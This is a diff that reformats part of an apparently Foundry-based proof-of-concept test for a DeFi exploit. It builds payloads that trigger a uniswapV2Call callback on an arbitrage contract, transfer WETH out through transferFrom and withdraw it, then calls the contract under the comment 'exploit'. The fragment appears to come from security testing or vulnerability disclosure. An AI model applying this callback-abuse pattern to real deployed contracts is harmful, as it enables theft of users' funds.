@@ -29,17 +29,27 @@ contract LoanPocTest is Test {
 
         // approve weth
         bytes[] memory payloads = new bytes[](3);
-        payloads[0] = abi.encode(exploit, 0, abi.encodeWithSignature(
-            "uniswapV2Call(address,uint256,uint256,bytes)", address(this), 0, 0, abi.encode(exploitData0, exploitData1)
-        ));
+        payloads[0] = abi.encode(
+            exploit,
+            0,
+            abi.encodeWithSignature(
+                "uniswapV2Call(address,uint256,uint256,bytes)",
+                address(this),
+                0,
+                0,
+                abi.encode(exploitData0, exploitData1)
+            )
+        );
         // transfer weth
-        payloads[1] = abi.encode(weth, 0, abi.encodeWithSignature(
-            "transferFrom(address,address,uint256)", exploit, address(arbitrage), exploit_amount
-        ));
+        payloads[1] = abi.encode(
+            weth,
+            0,
+            abi.encodeWithSignature(
+                "transferFrom(address,address,uint256)", exploit, address(arbitrage), exploit_amount
+            )
+        );
         // withdraw weth
-        payloads[2] = abi.encode(weth, 0, abi.encodeWithSignature(
-            "withdraw(uint256)", exploit_amount
-        ));
+        payloads[2] = abi.encode(weth, 0, abi.encodeWithSignature("withdraw(uint256)", exploit_amount));
 
         // exploit
         arbitrage.run(abi.encode(blockhash(block.number - 1), 0, payloads));
